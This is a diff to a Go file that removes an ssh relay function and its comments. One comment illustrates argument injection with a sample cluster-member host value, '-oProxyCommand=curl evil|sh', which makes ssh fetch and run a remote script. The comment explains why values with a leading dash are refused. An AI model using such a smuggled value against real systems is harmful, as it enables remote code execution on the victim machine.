@@ -237,37 +237,6 @@ func nameOr(declared, workdir string) string {
 	return filepath.Base(workdir)
 }
 
-// relayTo builds the pipe that reaches a companion's daemon on another machine.
-//
-// The command is assembled HERE, from this machine's own template, with nothing taken from the
-// member entry but a hostname and the socket path it answers on. That is the rule the whole cluster
-// keeps and the reason a member cannot make anybody run anything it chose.
-//
-// The context is the only bound on the crossing. A pipe has no deadline to set, unlike a socket, so
-// what stops a wedged link from holding a wait open is the process being killed — which is what
-// CommandContext does when the caller's timeout expires.
-//
-// BatchMode, always: every caller is a tool call or a timer, and neither has a terminal for ssh to
-// ask a passphrase on. Without it the call hangs until the context kills it.
-//
-// ssh only, for now. A container or a jump host is a different template and the same pipe — which
-// is the point of the relay being dumb; see the note at the top of this file.
-func relayTo(ctx context.Context, host, socket string) (*pipe, error) {
-	if host == "" || socket == "" {
-		return nil, errNoRelay
-	}
-	// host and socket land in ssh's argv, and both come from cluster member records — network
-	// gossip. A value beginning with '-' is parsed by ssh as an OPTION, not an argument: a vouched
-	// member publishing Host="-oProxyCommand=curl evil|sh" would make ssh run that command on THIS
-	// machine. ssh has no '--' end-of-options marker for the host, so the guard is to refuse a
-	// leading dash — the same guard git.go puts on a ref before it reaches argv.
-	if !sshSafeArg(host) || !sshSafeArg(socket) {
-		return nil, errNoRelay
-	}
-	return pipeTo(exec.CommandContext(ctx, "ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10",
-		host, "magi", "--relay", socket))
-}
-
 // sshSafeArg rejects a value that ssh would parse as an option rather than a host/argument. The
 // socket also carries into a forced command's stream elsewhere, where a leading dash is harmless
 // data; this is for the argv path, where it is not.
